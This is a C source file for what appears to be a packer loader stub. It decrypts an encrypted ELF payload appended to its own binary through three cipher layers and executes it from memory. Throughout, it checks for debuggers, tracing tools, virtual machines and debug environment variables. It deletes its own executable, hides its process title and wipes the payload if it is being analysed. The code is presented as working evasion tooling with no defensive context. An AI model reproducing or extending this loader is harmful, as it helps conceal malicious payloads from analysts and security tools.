#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <time.h>
#include <errno.h>
#include "common.h"
#include "elf64.h"
#include "crypto.h"

int detect_ptrace_arm64(void) {
    pid_t child = fork();
    if (child == 0) { 
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
            exit(1);
        }
        exit(0); 
    } else if (child > 0) {
        int status;
        waitpid(child, &status, 0);
        return WEXITSTATUS(status) != 0;
    }
    return 0;
}

int check_proc_status(void) {
    FILE* status_file = fopen("/proc/self/status", "r");
    if (!status_file) return 0;

    char line[256];
    while (fgets(line, sizeof(line), status_file)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int tracer_pid = atoi(line + 10);
            fclose(status_file);
            return tracer_pid != 0;
        }
    }
    fclose(status_file);
    return 0;
}

int check_parent_process(void) {
    FILE* stat_file = fopen("/proc/self/stat", "r");
    if (!stat_file) return 0;

    pid_t ppid;
    if (fscanf(stat_file, "%*d %*s %*c %d", &ppid) != 1) {
        fclose(stat_file);
        return 0;
    }
    fclose(stat_file);

    char comm_path[64];
    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", ppid);

    FILE* comm_file = fopen(comm_path, "r");
    if (comm_file) {
        char parent_name[64];
        if (fgets(parent_name, sizeof(parent_name), comm_file)) {
            fclose(comm_file);

            parent_name[strcspn(parent_name, "\n")] = 0;

            // Check for analysis tools
            if (strcmp(parent_name, "gdb") == 0 ||
                strcmp(parent_name, "strace") == 0 ||
                strcmp(parent_name, "ltrace") == 0 ||
                strcmp(parent_name, "radare2") == 0 ||
                strcmp(parent_name, "objdump") == 0 ||
                strcmp(parent_name, "hexdump") == 0 ||
                strcmp(parent_name, "ghidra") == 0) {
                return 1;
            }
        } else {
            fclose(comm_file);
        }
    }
    return 0;
}


int detect_virtualization(void) {
    FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
    if (!cpuinfo) return 0;

    char line[256];
    while (fgets(line, sizeof(line), cpuinfo)) {
        for (char* p = line; *p; p++) {
            if (*p >= 'A' && *p <= 'Z') *p += 32;
        }

        if (strstr(line, "hypervisor") || strstr(line, "qemu") || 
            strstr(line, "kvm") || strstr(line, "xen") ||
            strstr(line, "vmware") || strstr(line, "virtualbox")) {
            fclose(cpuinfo);
            return 1;
        }
    }
    fclose(cpuinfo);

    // Check for virtualization-specific files and directories
    if (access("/proc/xen", F_OK) == 0) return 1;
    if (access("/sys/hypervisor/type", F_OK) == 0) return 1;
    if (access("/proc/vz", F_OK) == 0) return 1;
    if (access("/proc/bc", F_OK) == 0) return 1;

    return 0;
}

int check_debug_environment(void) {
    // Check suspicious environment variables
    if (getenv("LD_PRELOAD")) return 1;
    if (getenv("GDB")) return 1;
    if (getenv("PTRACE_SCOPE")) return 1;
    if (getenv("STRACE_LOG")) return 1;
    if (getenv("LTRACE_LOG")) return 1;
    if (getenv("RADARE2_LOG")) return 1;

    return 0;
}

int comprehensive_anti_debug_check() {

    // This logic can be expanded
    if (detect_ptrace_arm64()) {
        return 1;
    }
    if (check_proc_status()) {
        return 1;
    }
    if (check_parent_process()) {
        return 1;
    }
    if (detect_virtualization()) {
        return 1;
    }
    if (check_debug_environment()) {
        return 1;
    }

    return 0;
}


void multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
    
    rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
    
    chacha20_decrypt(data, len, header->secondary_key, header->nonce);

    aes256_decrypt(data, len, header->primary_key);
    
}

pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
    if (data_size < sizeof(pack_header_t)) {
        return NULL;
    }
    for (size_t i = data_size - sizeof(pack_header_t); i > 0; i--) {
        pack_header_t* header = (pack_header_t*)(data + i);
        if (header->magic == PACKED_MAGIC) {
            return header;
        }
    }
    return NULL;
}

int main(int argc, char* argv[], char* envp[]) {
    FILE* self_fp;
    uint8_t* self_data;
    size_t self_size;
    pack_header_t* header;
    uint8_t* encrypted_data;
    uint8_t* decrypted_data;
    uint32_t calculated_crc;

    unlink(argv[0]);
    prevent_core_dumps();
    hide_process_title(argc, argv);

    self_fp = fopen("/proc/self/exe", "rb");
    if (!self_fp) {
        return 1;
    }

    fseek(self_fp, 0, SEEK_END);
    self_size = ftell(self_fp);
    fseek(self_fp, 0, SEEK_SET);

    if (self_size == 0 || self_size > SIZE_MAX / 2) {
        fclose(self_fp);
        return 1;
    }

    self_data = malloc(self_size);
    if (!self_data) {
        fclose(self_fp);
        return 1;
    }

    size_t bytes_read = fread(self_data, 1, self_size, self_fp);
    if (bytes_read != self_size) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        fclose(self_fp);
        return 1;
    }
    fclose(self_fp);

    header = find_packed_header(self_data, self_size);
    if (!header) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }

    if (comprehensive_anti_debug_check()) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        exit(0);
    }

    encrypted_data = (uint8_t*)header + sizeof(pack_header_t);
    if (encrypted_data + header->packed_size > self_data + self_size) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }
    decrypted_data = malloc(header->original_size);
    if (!decrypted_data) {
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }

    memcpy(decrypted_data, encrypted_data, header->original_size);

    multi_layer_decrypt(decrypted_data, header->original_size, header);
    calculated_crc = crc32(decrypted_data, header->original_size);
    if (calculated_crc != header->crc32) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }
    if (!is_elf64(decrypted_data)) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    } 
    if (comprehensive_anti_debug_check()) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        exit(0);
    }
    if (execute_from_memory(decrypted_data, header->original_size, argv, envp) < 0) {
        secure_memory_wipe(decrypted_data, header->original_size);
        secure_memory_wipe(self_data, self_size);
        free(decrypted_data);
        free(self_data);
        return 1;
    }

    secure_memory_wipe(decrypted_data, header->original_size);
    secure_memory_wipe(self_data, self_size);
    free(decrypted_data);
    free(self_data);

    return 0;
}